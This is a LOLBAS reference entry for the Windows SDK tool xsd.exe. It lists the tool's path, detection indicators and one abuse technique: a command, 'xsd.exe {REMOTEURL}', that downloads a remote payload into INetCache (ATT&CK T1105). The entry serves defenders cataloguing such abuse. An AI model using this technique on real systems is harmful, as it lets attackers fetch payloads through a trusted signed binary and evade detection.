---
title: "xsd.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/xsd/
fetched_at: 2026-09-20T17:16:05Z
license: unspecified
category: windows
---

XML Schema Definition Tool included with the Windows Software Development Kit (SDK).

## Paths
- C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe

## Acknowledgements
- Avihay Eldad ([@AvihayEldad](https://twitter.com/@AvihayEldad))

## Detections
- IOC: URL on a xsd.exe command line
- IOC: xsd.exe making unexpected network connections or DNS requests

## Download

1. Downloads payload from remote server

```
xsd.exe {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
